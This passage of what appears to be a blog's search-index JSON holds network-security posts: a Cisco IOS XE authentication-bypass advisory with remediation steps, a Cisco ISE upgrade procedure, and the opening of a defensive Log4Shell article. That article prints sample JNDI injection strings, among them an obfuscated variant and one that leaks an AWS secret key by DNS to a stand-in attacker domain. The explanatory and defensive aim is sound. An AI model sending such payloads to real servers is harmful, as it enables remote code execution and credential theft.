help cover myself should any unrelated issues pop-up in the network infrastructure. It's a bit of a CYA, and by showing your customers and management that you are using best practices for first verifying your playbooks (in addition to all the testing you did you with your playbook in a lab environment!), you will gain the confidence and trust from your stakeholders. This helps further promote using automation as part of your job, if you can demonstrate it being done in a safe way.</p>","tags":["Automation","Ansible"]},{"location":"2021/09/26/cisco-ios-xe-netconf-and-restconf-authentication-bypass-vulnerability/","title":"Cisco IOS XE Netconf and Restconf Authentication Bypass Vulnerability","text":"<p>Earlier this week Cisco announced in its semiannual Cisco IOS and IOS XE bundled software security advisory publication some very concerning security advisories (3 critical, 11 high and 11 medium severity), one of which allows an attacker to bypass authentication on devices configured for netconf or restconf. After an attacker has bypassed authentication, they can install, manipulate, or delete your Cisco IOS XE devices configuration or cause a memory corruption that results in a denial of service (DoS) condition.</p> <p>This authentication bypass vulnerability has multiple conditions that must be met for a device to be considered vulnerable:</p> <ul> <li>The software version of Cisco IOS XE must match one of the ~140 impacted software versions. Review the CVRF file for a list of affected software versions or the software checker utility, both found at the advisory link</li> <li>You must have have multiple features configured:</li> <li>Authentication, Authorization, Accounting (AAA), and</li> <li>Netconf or restconf, and</li> <li>An enable password without an enable secret configured</li> </ul> <p>To validate if the affected features are enabled use the following commands:</p> <ul> <li>Validating AAA is configured</li> <li>show running-config | include aaa authentication login</li> <li>Validating Netconf or Restconf is configured</li> <li>show running-config | include netconf|restconf</li> <li>Validating the enable password and secret configuration</li> <li>show running-config | include enable password|secret</li> </ul>","tags":["Automation","Cisco","Security"]},{"location":"2021/09/26/cisco-ios-xe-netconf-and-restconf-authentication-bypass-vulnerability/#remediating-the-exposure","title":"Remediating the Exposure","text":"<p>There are multiple steps that should be taken to remediate, or limit, the exposure to this vulnerability, as well as some best practices to follow when it comes to the affected features. These include:</p> <ul> <li>Re-issue secrets, passphrases, and keys</li> <li>Configure an enable secret and remove the enable password</li> <li>Configure Netconf and Restconf Service-Level ACL's</li> <li>Compare Configuration for Signs of Manipulation</li> <li>Upgrade to an Unaffected Cisco IOS XE Software Version</li> </ul>","tags":["Automation","Cisco","Security"]},{"location":"2021/09/26/cisco-ios-xe-netconf-and-restconf-authentication-bypass-vulnerability/#re-issue-secrets-passphrases-and-keys","title":"Re-Issue Secrets, Passphrases, and Keys","text":"<p>Given that the vulnerability allows a remote attacker to manipulate the current configuration on an affected device, it would be best to consider the configuration compromised. Sensitive information stored within your Cisco IOS XE devices configuration could include:</p> <ul> <li>Local usernames and password</li> <li>Enable password</li> <li>Enable secret</li> <li>Keychains used for various different protocols</li> <li>Protocol authentication keys (routing protocols, FHRP's, VTP, IKE, NTP, TACACS+, RADIUS, etc)</li> </ul> <p>Note</p> <p>It's worth noting that the entire configuration file of your device should be considered sensitive. The protocols which you have enabled, the software version, IP addresses used, the physical connections, and administratively defined variables. All of this information can be used by an attacker to survey your infrastructure to prepare for another attack. Unfortunately, it can be quite difficult to change your network architecture simply because your configuration is potentially compromised. However, there are are best-practices that you can follow for securing network device management functions to reduce your exposure</p> <p>I'll refere to the list of sensitive information above simply as secrets going forward. Some of these secrets, depending on the feature that they are configured for, can be stored in clear-text or in an encrypted fashion. It is good to be in the habit of changing these secrets on a regular interval and using strong password requirements. By already having a process in place to programmatically change these secrets as part of regular lifecycle management, responding to a potential compromise becomes far easier. By using a tool such as Ansible, you can lifecycle secrets across multiple different device vendors and models (among so many other network management tasks!)</p>","tags":["Automation","Cisco","Security"]},{"location":"2021/09/26/cisco-ios-xe-netconf-and-restconf-authentication-bypass-vulnerability/#configure-an-enable-secret","title":"Configure an Enable Secret","text":"<p>Cisco's IOS hardening guide has long recommended using an enable secret instead of an enable password for securing privileged administrative access. Although this particular authentication bypass vulnerability also relies on AAA having been configured (wherein you would most likely be using an external service for authorizing privileged access), simply having an enable password configured in addition to AAA is one of the conditions for exposure. Even with AAA enabled, it is still recommended to configure a local enable secret in the event that your external AAA serves are not reachable.</p> <p>So what is the difference between an enable secret and an enable password? While both provide the same overall functionality (authorizing users into a higher privilege level), how the Cisco IOS XE device stores the key is different. The key associated with the enable password is stored using a weak cipher (if the service password-encryption feature is enabled) or in clear text. It uses the Vigenere cipher which can be easily deciphered. The enable secret key uses MD5 for one-way password hashing which cannot be reversed. If someone has the hash, they will be unable to put this through a mathmatical formula to reverse it to clear text. It is susceptiable to dictionary attacks, but this is only if your Cisco IOS XE's configuration file has been compromised (see the recommendation above about re-issuing local secrets, passphrases, and keys).</p> <p>If you have any network devices still configured with an enable password instead of an enable secret, it is strongly recommended to configure an enable secret (with a different key than the enable password) and remove the enable password. This is one of Cisco's recommended steps to remediate this authentication bypass vulnerability. It can be accomplished as simply as:</p> <pre><code>Router#config t\nEnter configuration commands, one per line.  End with CNTL/Z.\nRouter(config)#enable secret F@ncy3nable5ecret\nRouter(config)#no enable password\nRouter(config)#\n</code></pre>","tags":["Automation","Cisco","Security"]},{"location":"2021/09/26/cisco-ios-xe-netconf-and-restconf-authentication-bypass-vulnerability/#configure-netconf-and-restconf-service-level-acls","title":"Configure Netconf and Restconf Service-Level ACL's","text":"<p>There are most likely a very small number of sources that should be interfacing with the Netconf or Restconf services on your Cisco IOS XE devices. Once enabled, the default Netconf/Restconf configuration allows any source to communicate with the Netconf/Restconf service, as long as it has IP reachability to your network device. To limit your exposure, you can configure Netconf/Restconf service-level ACL's to restrict only known trusted source IP address ranges to communicate with these services on the network device. Although this is not guaranteed to secure your device (a compromised network management system may be within the permitted source address ranges), it is one method that can be used to make it far more difficult for an attacker.</p> <p>To configure a service-level ACL and apply it to the Netconf and Restconf protocols, see the following as an example. In this case we are permitting two network management IP address ranges 10.1.255.0/24 and 10.2.255.0/24, followed by applying the ACL to the Netconf and Restconf processes:</p> <pre><code>Router#config t\nRouter(config)#ip access-list standard NET_MGMT_RANGES_ACL\nRouter(config-std-nacl)#permit 10.1.255.0 0.0.0.255\nRouter(config-std-nacl)#permit 10.2.255.0 0.0.0.255\nRouter(config-std-nacl)#exit\nRouter(config)#netconf-yang ssh ipv4 access-list name NET_MGMT_RANGES_ACL\nRouter(config)#restconf ipv4 access-list name NET_MGMT_RANGES_ACL\n</code></pre>","tags":["Automation","Cisco","Security"]},{"location":"2021/09/26/cisco-ios-xe-netconf-and-restconf-authentication-bypass-vulnerability/#compare-configuration-for-signs-of-manipulation","title":"Compare Configuration for Signs of Manipulation","text":"<p>As stated previously, this particular vulnerability allows an attacker to manipulate the configuration of your network device. As a result, you should be looking for any signs of manipulation within that configuration. A few steps that you can take to identify unauthorized configuration changes:</p> <ul> <li>Compare your running and startup configurations to a known 'gold standard' and review any deviations</li> <li>Review any TACACS or RADIUS logs. This may require going as far back in time as you have been running the vulnerable Cisco IOS XE version or affected features</li> <li>Review any syslog data for when configuration changes have been made. If you are logging at level 5 (notice) or higher, you can search your log data for SYS-5-CONFIG_I</li> </ul>","tags":["Automation","Cisco","Security"]},{"location":"2021/09/26/cisco-ios-xe-netconf-and-restconf-authentication-bypass-vulnerability/#upgrade-to-an-unaffected-cisco-ios-xe-software-version","title":"Upgrade to an Unaffected Cisco IOS XE Software Version","text":"<p>Finally, if you are unable to modify the configuration of your network device so that it is not running affected features, you can upgrade the software version to one which is not affected by this vulnerability. This would require intrusive changes as the network device is upgraded, and would require more planning and research to identify which version of software to move to.</p>","tags":["Automation","Cisco","Security"]},{"location":"2021/12/27/cisco-ise-24-to-30-upgrade-procedure/","title":"Cisco ISE 2.4 to 3.0 Upgrade Procedure","text":"<p>If you have ever read through Cisco ISE 3.0 Upgrade Guide you know that it involves a lot of decision points and having to reference many other Cisco reference documents just to build a complete implementation plan for upgrading Cisco ISE from 2.x to 3.x. It is a complicated process if you have never been through it before, and often times you're left with more questions than answers when researching how to proceed. This usually involves engaging Cisco TAC to help clarify points that aren't necessarily obvious in their documentation. Having gone through this upgrade path this past year, I thought that documenting the procedures that I followed may help others gain success in their own upgrades. Understand that all implementations are different, so use this as another piece of information as you research how to perform this upgrade.</p>","tags":["Cisco","Security"]},{"location":"2021/12/27/cisco-ise-24-to-30-upgrade-procedure/#example-cisco-ise-environment","title":"Example Cisco ISE Environment","text":"<p>This guide is built based on the following Cisco ISE environment:</p> <ul> <li>All Cisco ISE nodes are virtual machines running on VMWare ESXi</li> <li>Nodes are deployed as follows</li> <li>Two Admin (primary/secondary)</li> <li>Two Monitor (primary/secondary)</li> <li>Four PSN's</li> <li>None of the PSN's are behind load balancers</li> <li>PSN's are only being used for TACACS/RADIUS authentication, not for any discovery or dot1x authentication</li> <li>AD is used as an external identify source</li> </ul> <p>Note</p> <p>Cisco's documentation briefly glosses over placing your PSN's behind a load balancer. I have seen this done in larger organizations, but not in smaller ones. There is definitely a benefit to using a load balancer, as it allows you to take a PSN out of rotation so that you can upgrade it and change its IP address (which will save you a few steps in this guide). You avoid causing an outage for clients using the PSN's as they are querying againt a load balancer VIP and you should only be upgrading one PSN in the load balancer pool at a time.</p>","tags":["Cisco","Security"]},{"location":"2021/12/27/cisco-ise-24-to-30-upgrade-procedure/#cisco-ise-upgrade-methods","title":"Cisco ISE Upgrade Methods","text":"<p>Cisco provides three different methods that you can follow for upgrading Cisco ISE:</p> <ol> <li>Backup and Restore method, which Cisco recommends but is the the most difficult to implement</li> <li>Upgrade using the GUI, which takes more time but is the 'easiest' method to follow</li> <li>Upgrade using the CLI, which is just slightly more difficult than using the GUI</li> </ol> <p>Not all deployments are able to use each of these methods. In this particular example, the GUI and CLI options are not possible because of how the Cisco ISE 2.4 VM's were deployed. Version 3.0 requires signinficantly more disk space than version 2.4. A disk size of 300GB to 600GB are required, as a minimum, on each node regardless of its persona, compared to what many 2.4 deployments required (200GB). Cisco also advises that if you increase the disk size of your VM, you must perform a fresh installation of Cisco ISE to detect the increased capacity. There is no supported method of increasing the disk size.</p> <p>The other challenge of building new PSN VM's is that without a load balancer, all of your routers, switches, and wireless controllers are referencing TACACS/RADIUS server IP addresses that exist directly on the PSN's. Cisco's documentation walks through creating new VM's with new IP addresses, which means that you will need to reconfigure all network infrastructure to point to a new TACACS/RADIUS server IP address. This can involve a significant amount of time if you're not using automation to implement this task. You do have the ability to change the IP address of the new 3.0 PSN after it has been created and the old 2.4 PSN has been shutdown, but this involves additional steps as well (e.g. having to de-register and re-register the PSN from the admin node, adjusting DNS entries). Instead, this guide walks through keeping both 2.4 and 3.0 VM's with the same IP addresses, but shutting down the 2.4 VM before building the new 3.0 VM. There is a brief moment in time where impact can be seen by the network device must wait for keepalives to fail to a PSN thats being migrated, before it starts to query a secondary PSN that isn't currently being migrated.</p> <p>Note</p> <p>Another important aspect of upgrading from ISE 2.4 to 3.0 is that licensing changes to requiring smart licensing. If you don't yet have smart licensing, but need to perform an upgrade, you can enable the grace period license which should provide 90 days for you to continue using all necessary features until you migrade to smart licensing. The steps to adjust licensing are not covered in this guide.</p>","tags":["Cisco","Security"]},{"location":"2021/12/27/cisco-ise-24-to-30-upgrade-procedure/#implementation-and-verification-plan","title":"Implementation and Verification Plan","text":"","tags":["Cisco","Security"]},{"location":"2021/12/27/cisco-ise-24-to-30-upgrade-procedure/#overview","title":"Overview","text":"<p>The steps documented below outline how to migrate Cisco ISE 2.4 VM's to 3.0 VM's using the Backup and Restore method. Depending on the size of your infrastructure, you may choose to migrate the PSN's over multiple change windows. This will depend on how frequenty you make changes in your environment, as you will end up having a 'split' cluster where one admin and monitor node remain on version 2.4 while another admin and monitor node are on version 3.0. Throughout multiple change windows, you can disable a version 2.4 PSN and build the 3.0 PSN. If you are frequently making policy changes, you either need to make them in both the 2.4 and 3.0 admin nodes, or migrate all PSN's during the same change window.</p> <p>Note</p> <p>The steps to perform on VMWare ESXi are not covered in this guide. Refer to Cisco's documentation for VM requirements, and VMWare's documentation for implementation steps that might be necessary to create the VM.</p>","tags":["Cisco","Security"]},{"location":"2021/12/27/cisco-ise-24-to-30-upgrade-procedure/#step-0-pre-change-readiness","title":"Step 0 - Pre-Change Readiness","text":"<p>To prepare for your migration you will want to ensure the status of multiple elements and perform backups of critical configuration and certificates. This can be accomplished as follows:</p> <ol> <li>Login to your 2.4 Primary Admin Node (PAN).</li> <li>Confirm all certificates are valid and not expired by browsing to Administration &gt; System &gt; Certificates and check the status of all Trusted Certificates.</li> <li>For each external identity source, ensure that connectivity from each PSN to each source is OK. As an example, for AD browse to Administration &gt; Identity Management &gt; External Identity Sources &gt; Active Directory\u2026 and for each join point check the reachability status for each PSN. <p>Identify the AD credentials which are necessary for each AD join-point. These are not restored when using the backup and restore method. Each join-point will need to be recreated later on in this guide.</p> </li> <li>Export any System Certificates that are used by your deployment by browsing to Administration &gt; System &gt; Certificates and clicking on System Certificates.</li> <li>Export any non-default Trusted Certificates that are used by your deploymet by browsing to Administration &gt; System &gt; Certificates and clicking on Trusted Certificates. Many of the certificates here are CA signed certificates that will exist in ISE version 3.0 and are not necessary to manually export and re-import. Only the certificates that you have imported for your organization. <p>Certificates are not automatically restored in the backup and restore method, therefore it is critical to create a backup of these in case issues are experienced during the upgrade.</p> </li> <li>Document PAN auto-failover settings by browsing to Administration &gt; System &gt; Deployment &gt; PAN Failover and documenting the status and value for all settings.</li> <li>Perform a manual Configuration Data Backup of the Cisco ISE settings. If you require logs to be backed up and referencable in the new ISE 3.0 implementation, perform an Operational Backup (this will be significantly larger and require more time). Browse to Administration &gt; System &gt; Backup &amp; Restore, select Configuration Data Backup and click on Backup Now. Provide the necessary details and utilize an existing backup repository.</li> <li>SSH to each Cisco ISE node and log the output of the following commands to file. These will later be used to reconfigure the new Cisco ISE 3.0 VM's, as well as to capture the status of each VM prior to the upgrade to identify any anomalies if they happen (e.g. high CPU, application services not running, etc)</li> <li>show clock</li> <li>show version</li> <li>show ntp</li> <li>show uptime</li> <li>show cpu usage</li> <li>show repository</li> <li>show application</li> <li>show application status ise</li> <li>show running-config</li> <li>Ensure that a DNS entry exists for each Cisco ISE node, as this will be used as part of the re-registration process when joining a PSN to the version 3.0 ISE admin node.</li> </ol>","tags":["Cisco","Security"]},{"location":"2021/12/27/cisco-ise-24-to-30-upgrade-procedure/#step-1-create-cisco-ise-30-primary-admin-node","title":"Step 1 - Create Cisco ISE 3.0 Primary Admin Node","text":"<p>During this step we will be disabling the version 2.4 secondary admin node (SAN) and re-creating it as the version 3.0 primary admin node (PAN).</p> <ol> <li>Login to your 2.4 Primary Admin Node (PAN).</li> <li>Disable PAN auto-failover by browsing to Administration &gt; System &gt; Deployment &gt; PAN Failover and unchecking the Enable PAN Auto Failover option, then click save.</li> <li>Disjoin the SAN from each AD join-point. Browse to Administration &gt; Identity Management &gt; External Identity Sources, click the Active Directory folder and navigate to each join-point and perform the following steps:</li> <li>Find the SAN and select the checkbox next to it</li> <li>Click the Leave button to Disjoin the SAN</li> <li>De-register the SAN from the version 2.4 cluster. Browse to Administration &gt; System &gt; Deployment and check the box next to the SAN. Click the Deregister button and then OK to de-register the SAN from the cluster.</li> <li>Shutdown the version 2.4 SAN VM in VMWare.</li> <li>Create the ISE version 3.0 VM which will be configured with the properties of the version 2.4's SAN (except it will be the PAN of the version 3.0 cluster)</li> <li>Once the VM is built in the hypervisor, use the serial console to connect and issue the setup command. This will prompt you for various parameters such as hostname, IP address, DNS and NTP servers, local admin credentials to use, etc. You can find this information from the output of the show running-config that was captured during step 0 of this guide.</li> <li>After entering the initial setup parameters, the node will reload. Log back in to the CLI using the serial console and configure any remaining features by comparing the output of the show running-config from before the change with what is currently in the configuration. An example of what may need to be configured would be features like SNMP (enabling it, community strings, trap destinations, etc.) and any other local accounts.</li> <li>Confirm that the node is running the correct version and patches with the show version command and that the ISE process is running with the show application status ise.</li> <li>Browse to the IP address or FQDN of the version 3.0 PAN that has just been created and login. The web GUI's admin credentials are those that were set using the setup command on the CLI     &gt; Both the web and CLI admin credentials may start off as the same credential, but Cisco ISE treats them as two completely separate accounts.</li> <li>Set the role of the version 3.0 PAN as an admin node by browsing to Administration &gt; System &gt; Deployment and clicking on Deployment. Select the node from the list and enable the Administration role on the General Settings tab.</li> <li>Browse to Administration &gt; System &gt; Maintenance &gt; Repository and create a repository so that the backup can be imported.</li> <li>Import this nodes system certificate by browsing to Administration &gt; System &gt; Certificates and click on System Certificates. Click on Import and fill in the details of the version 3.0 PAN and select the certificate file for this node that was exported during step 0.</li> <li>Import all trusted certificates by browsing to Administration &gt; System &gt; Certificates and click on Trusted Certificates. Import each Trusted Certificate that were exported during step 0, and compare the configuration with that of the existing version 2.4 PAN that should still be accessible.</li> <li>Create the Active Directory join-points by browsing to Administration &gt; Identity Management &gt; External Identity Sources and clicking on Active Directory. Once again, you can look at both the version 2.4 PAN and the new version 3.0 PAN at the same time to ensure that each join-point is created the same.</li> <li>Join the version 3.0 PAN to each AD join-point. Under each join-points Connection tab click the Join button, select the new node from the list, provide the AD credentials gathered as part of step 0, and click submit. Confirm that the status of the node for each join-point is Operational.</li> <li>Restore the ISE backup by SSH'ing to the version 3.0 PAN and logging in. Run the command restore FILE_NAME repository REPO_NAME encryption-key plain ENC_KEY using the repository name that was created earlier, along with the filename that was given to the backup during step 0.</li> <li>You can monitor the backup restoration using the show restore status command. Once the restore has been completed, the node will reload. SSH back into this node and issue the show application status ise command to ensure the ISE process is running.</li> <li>Log back into the version 3.0 PAN web GUI. Make the version 3.0 PAN the primary admin node by browsing to Administration &gt; System &gt; Deployment and click the name of the node. Under the General Settings click the button that says Make Primary.</li> </ol>","tags":["Cisco","Security"]},{"location":"2021/12/27/cisco-ise-24-to-30-upgrade-procedure/#step-2-create-cisco-ise-30-primary-monitor-node","title":"Step 2 - Create Cisco ISE 3.0 Primary Monitor Node","text":"<p>During this step we will be disabling the version 2.4 secondary monitor node (SMN) and re-creating it as the version 3.0 primary monitor node (PMN). Many of these steps are the same as in step 1 when creating the ISE 3.0 PAN, so the steps are shortened for brevity.</p> <ol> <li>Login to your 2.4 PAN's web GUI.</li> <li>Disjoin the SMN from each AD join-point in the version 2.4 PAN.</li> <li>De-register the SMN in the version 2.4 PAN.</li> <li>Shutdown the version 2.4 SMN VM (don't delete), create the new version 3.0 SMN VM and configure over the serial console using the setup command, referencing the show running-config that was captured during step 0 of this guide. The node will reload after finishing the setup, log back in and configure any remaining elements (SNMP, local accounts, etc.) by comparing the show running-config that was gathered in step 0 with the current output of the configuration on the version 3.0 node.</li> <li>Validate that the node is running the proper version of software with show version and that the ISE process is running with show application status ise.</li> <li>Login to your 3.0 PAN's web GUI.</li> <li>Register the verison 3.0 PMN VM as the primary monitoring node by registering the node in the version 3.0 PAN.</li> <li>Set the role of the version 3.0 PMN as a monitor node by browsing to Administration &gt; System &gt; Deployment and clicking on Deployment. Select the node from the list and enable the Monitor role on the General Settings tab, setting it to primary if prompted.</li> <li>Import this nodes system certificate by browsing to Administration &gt; System &gt; Certificates and click on System Certificates. Click on Import and fill in the details of the version 3.0 PMN and select the certificate file for this node that was exported during step 0.</li> <li>Join the node to each AD join-point and ensure that its status is Operational.</li> </ol>","tags":["Cisco","Security"]},{"location":"2021/12/27/cisco-ise-24-to-30-upgrade-procedure/#step-3-create-cisco-ise-30-node-groups","title":"Step 3 - Create Cisco ISE 3.0 Node Groups","text":"<p>If you use node groups in your ISE deployment, follow the steps listed below.</p> <p>Note</p> <p>Node groups are not re-created when using the backup and restore method with Cisco ISE. They must be manually recreated.</p> <ol> <li>Login to your 3.0 PAN's web GUI.</li> <li>Browse to Administration &gt; Deployment and under the Deployment column click the gear icon and Create Node Group.</li> <li>Create the node groups by also logging into your version 2.4 PAN and comparing the configuration with your new version 3.0 PAN.</li> </ol>","tags":["Cisco","Security"]},{"location":"2021/12/27/cisco-ise-24-to-30-upgrade-procedure/#step-4-create-cisco-ise-30-policy-service-nodes","title":"Step 4 - Create Cisco ISE 3.0 Policy Service Nodes","text":"<p>During this step we will be disabling a version 2.4 policy service node (PSN) and re-creating it as a version 3.0 PSN. Many of these steps are the same as in step 1 when creating the ISE 3.0 PAN, so the steps are shortened for brevity. Perform each of these steps for each PSN, but only migrate one PSN at a time.</p> <p>Note</p> <p>At this stage, you may choose to migrate PSN's across multiple change windows depending on your organizations needs. However, if you need to make any policy configuration changes in Cisco ISE you will need to perform identical changes in both the version 2.4 and 3.0 PAN's. There will also be a period in time where the admin and monitor nodes of each cluster are not redundant.</p> <ol> <li>Login to your 2.4 PAN's web GUI.</li> <li>Disable the Policy Service feature for this node so that it will no longer respond to TACACS/RADUS requests (allowing any network device that used this PSN to mark it as down after a period of time and reference another PSN), by browsing to Administration &gt; System &gt; Deployments, clicking on the node, navigating to the General Settings tab and deselecting the checkbox for Policy Service, then click Save.</li> <li>Disjoin the PSN from each AD join-point in the version 2.4 PAN.</li> <li>De-register the PSN in the version 2.4 PAN.</li> <li>Shutdown the version 2.4 PSN VM (don't delete), create the new version 3.0 PSN VM and configure over the serial console using the setup command, referencing the show running-config that was captured during step 0 of this guide. The node will reload after finishing the setup, log back in and configure any remaining elements (SNMP, local accounts, etc.) by comparing the show running-config that was gathered in step 0 with the current output of the configuration on the version 3.0 node.</li> <li>Validate that the node is running the proper version of software with show version and that the ISE process is running with show application status ise.</li> <li>Login to your 3.0 PAN's web GUI.</li> <li>Register the verison 3.0 PSN VM in the version 3.0 PAN's deployment.</li> <li>Import this nodes system certificate by browsing to Administration &gt; System &gt; Certificates and click on System Certificates. Click on Import and fill in the details of the version 3.0 PSN and select the certificate file for this node that was exported during step 0.</li> <li>Join the node to each AD join-point and ensure that its status is Operational.</li> <li>Set the role of the version 3.0 PSN by browsing to Administration &gt; System &gt; Deployment and clicking on Deployment. Select the node from the list and enable the Policy Service role on the General Settings tab and compare the remaining settings to that of the node in your version 2.4 PAN's web GUI.</li> <li>Login to various network devices that are configured with this PSN and issue test aaa... type commands to confirm reachability to the PSN, as well as that the PSN can authenticate a test user ID using its AD join-points. You can also monitor live requests via the version 3.0 PAN by browsing to Operations &gt; RADIUS &gt; Live Logs and Operations &gt; TACACS &gt; Live Logs to see incoming TACACS/RADIUS requests and if they are successfully authenticated/authorized.</li> </ol>","tags":["Cisco","Security"]},{"location":"2021/12/27/cisco-ise-24-to-30-upgrade-procedure/#step-5-create-cisco-ise-30-secondary-monitor-node","title":"Step 5 - Create Cisco ISE 3.0 Secondary Monitor Node","text":"<p>During this step we will be disabling the version 2.4 primary monitor node (PMN) and re-creating it as the version 3.0 secondary monitor node (SMN). Follow the same steps that are used in step 2, but when setting the role of this SMN, if prompted set it to secondary.</p>","tags":["Cisco","Security"]},{"location":"2021/12/27/cisco-ise-24-to-30-upgrade-procedure/#step-6-create-cisco-ise-30-secondary-admin-node","title":"Step 6 - Create Cisco ISE 3.0 Secondary Admin Node","text":"<p>During this step we will be disabling the version 2.4 primary admin node (PAN) and re-creating it as the version 3.0 secondary admin node (SAN). Follow many of the same steps that are used in step 2, but when setting the role of this SAN, set it to Admin and if prompted mark it as secondary.</p>","tags":["Cisco","Security"]},{"location":"2021/12/27/cisco-ise-24-to-30-upgrade-procedure/#step-7-promote-cisco-ise-30-admin-and-monitor-nodes-optional","title":"Step 7 - Promote Cisco ISE 3.0 Admin and Monitor Nodes (Optional)","text":"<p>During this step we will be promoting the version 3.0 secondary admin and monitor nodes to primary, to match that of the previous version 2.4 deployment. If you do not have a requirement for specific nodes to be primary and other nodes to be secondary, you can ignore this step.</p> <ol> <li>Login to your 3.0 SAN's web GUI.</li> <li>Browse to System &gt; Deployment and click the button Promote to Primary</li> <li>Validate the health of the new admin node by browsing to System &gt; Deployment and confirming that the Node Status is green for all nodes.</li> <li>Confirm that all nodes have connectivity to each AD join-point.</li> <li>Browse to System &gt; Deployments and select the current PMN. In the Monitoring section change the role from Primary to Secondary.</li> </ol>","tags":["Cisco","Security"]},{"location":"2021/12/27/cisco-ise-24-to-30-upgrade-procedure/#step-8-re-enable-pan-auto-failover","title":"Step 8 - Re-Enable PAN Auto-Failover","text":"<p>During this step we will be re-enabling the PAN auto-failover feature which was disabled in step 1.</p> <ol> <li>Login to your 3.0 Primary Admin Node (PAN).</li> <li>Enable PAN auto-failover by browsing to Administration &gt; System &gt; Deployment &gt; PAN Failover and checking the Enable PAN Auto Failover option. Set the auto-failover settings that were documented during step 0, then click save.</li> </ol>","tags":["Cisco","Security"]},{"location":"2021/12/27/cisco-ise-24-to-30-upgrade-procedure/#backout-plan","title":"Backout Plan","text":"<p>Should you need to backout to the version 2.4 Cisco ISE environment you should have all of the version 2.4 VM's in a shutdown state on their respective hypervisors. Although this consumes space and resources on the hypervisory, it is beneficial to keep these around for several weeks until the new version 3.0 environment is confirmed operational. However, if issues are encountered and you need to backout to version 2.4 you shutdown the version 3.0 VM's and re-enable the version 2.4 VM's in a similar order to how you migrated from 2.4 to 3.0. You will need to re-register and join to the AD join-points for each node.</p>","tags":["Cisco","Security"]},{"location":"2021/12/29/the-role-of-network-security-to-fight-log4shell/","title":"The Role of Network Security to Fight Log4Shell","text":"<p>December 9th, 2021 rocked the world for a significant number of IT professionals responsible for building and protecting applications their organizations create/deploy. Apache announced CVE-2021-44228, commonly referred to as log4Shell, a zero-day vulnerability affecting their log4j logging software. Due to the severity of the vulnerability and the relative ease at which to exploit it, it is critical to ensure that affected assets are protected. This article aims to highlight how the network plays a critical role in the protection of assets and detection of vulnerabilities like log4shell.</p>","tags":["Security"]},{"location":"2021/12/29/the-role-of-network-security-to-fight-log4shell/#what-is-log4j-and-jndi","title":"What is Log4J and JNDI?","text":"<p>Log4j is a logging package used in many Java-based applications and websites. With web servers it is a best practice to log incoming requests, allowing operators of a site to audit access, assess performance, detect attacks, and perform retroactive investigations. As an example, when a web server receives an HTTP request from a client, the clients IP address, URI, HTTP method and headers (e.g. user-agent), and other data may be logged to file. In an HTTP POST, you may also have some of the content logged.</p> <p>Java Naming and Directory Interface (JNDI) is used by log4j as a method of providing lookups on variables within a log by referencing naming and directory services such as LDAP, DNS, or other protocols. An example may include translating a username to groups that user is associated with, or an IP address to a FQDN. This can help build context within web server logs.</p> <p>Note</p> <p>These definitions are most certainly over simplifications of log4j and JNDI, but are hopefully specific enough for context around this vulnerability.</p>","tags":["Security"]},{"location":"2021/12/29/the-role-of-network-security-to-fight-log4shell/#what-is-log4shell","title":"What is Log4Shell?","text":"","tags":["Security"]},{"location":"2021/12/29/the-role-of-network-security-to-fight-log4shell/#the-vulnerabilities-so-far","title":"The Vulnerabilities (So Far)","text":"<p>There have been multiple vulnerabilities released since log4shell/CVE-2021-44228 was announced, which have driven the need for organizations to update/patch their log4j implementations multiple times over the past several weeks.Additional vulnerabilities have been discovered in subsequent patches, but log4shell is by far the most severe and is what this article will focus on.</p> <p>Log4shell allows a unauthenticated remote attacker to trigger a remote code execution (RCE) on an affected server, or exfiltration of data. Any website running an affected version of log4j, especially one that is internet facing or faces an untrusted zone, is particularly susceptible to this vulnerability as any attacker on the internet with IP reachability to the website can attempt to trigger the exploit.</p> <p>An attacker triggers the exploit by sending a crafted JNDI string in an HTTP header such as the user-agent, or as post form data. The webserver may then log the JNDI string, inadvertantly performing a lookup on untrusted user input data. Sanitization and validation of input data is a best practice, commonly used to prevent attacks like SQL injection. However, because the logging of an HTTP request may happen before the validation stage of data, it may be difficult to implement with untrusted data like JNDI strings that affect your logging utility.</p>","tags":["Security"]},{"location":"2021/12/29/the-role-of-network-security-to-fight-log4shell/#log4shell-attack-stages","title":"Log4shell Attack Stages","text":"<p>Log4shell is a multi-stage attack whereby an attacker sends an initial HTTP request to a web server (stage 1) and if affected, the web server performs the JNDI lookup by referencing a server the the attacker controls to download malicious code (stage 2), and then executes the malicious code (stage 3).</p> <p>Note</p> <p>User-Agent strings will be the primary examples in this article, but keep in mind that a JNDI string associated with any header or content that is logged by log4j can trigger the second phase of the attack. I also use an example destination of 127.0.0.1 but in reality this would be any IP address or hostname under the attackers control.</p> <p>An example of a malicious string in the HTTP request would be setting an HTTP header such as the user-agent, to a string such as a basic example of:</p> <pre><code>\"User-Agent: ${jndi:ldap://127.0.0.1/a}\"\n</code></pre> <p>JNDI strings in HTTP requests can be far more complex, such as:</p> <pre><code>\"User-Agent: ${${env:FOOBAR:-j}ndi:${env:FOOBAR:-l}dap${env:FOOBAR:-:}//127.0.0.1/a}\"\n</code></pre> <p>This initial HTTP request isn't malicious on its own. Instead, it triggers an affected web server to place an LDAP request to an attacker controlled LDAP server on the internet. The attackers LDAP server then responds with a malicious payload which the server then executes. This could then open a backdoor for the attacker to load a more comprehensive and destructive payload to the server allowing an attacker to further surveil your network, identifying other vulnerable servers, allowing an attacker to gain a larger footprint in your environment.</p> <p>The other aspect, which is more difficult to control (as described in the Prevention Measures section below), is a JNDI string that uses DNS instead of LDAP. An example of such a string is:</p> <pre><code>\"User-Agent: ${jndi:dns://${env:AWS_SECRET_ACCESS_KEY}.attacker-server.com}\"\n</code></pre> <p>In this particular example an attacker sends a JNDI string that causes an affected web server to append an environment variable as a sub-domain to a DNS query directed at a domain/DNS server controlled by the attacker (attacker-server.com). While this doesn't cause a vulnerable server to execute malicious code, it does signify to an attacker that a server is vulnerable and allows for exfiltration of sensitive information. Of course the environment variable actually needs to exist, but it would be easy for an attacker to send a series of HTTP requests with common environment variable names in the hopes of getting some information. Additionally, an attacker could append another sub-domain as an ID specific to the web server they are attacking, to help them keep track of which particular server was vulnerable and any environment variables related to it.</p>","tags":["Security"]},{"location":"2021/12/29/the-role-of-network-security-to-fight-log4shell/#the-importance-of-network-security","title":"The Importance of Network Security","text":"","tags":["Security"]},{"location":"2021/12/29/the-role-of-network-security-to-fight-log4shell/#the-unique-position-of-network-devices","title":"The Unique Position of Network Devices","text":"<p>Before a web request is received by a web server, the request is most likely going to flow through multiple network devices (e.g. routers, switches, firewalls, load balancers) managed by the organization. Even if you are in a cloud environment such as AWS, Azure, or GCP, you have the ability to place your own virtual network devices (e.g. virtual firewalls or 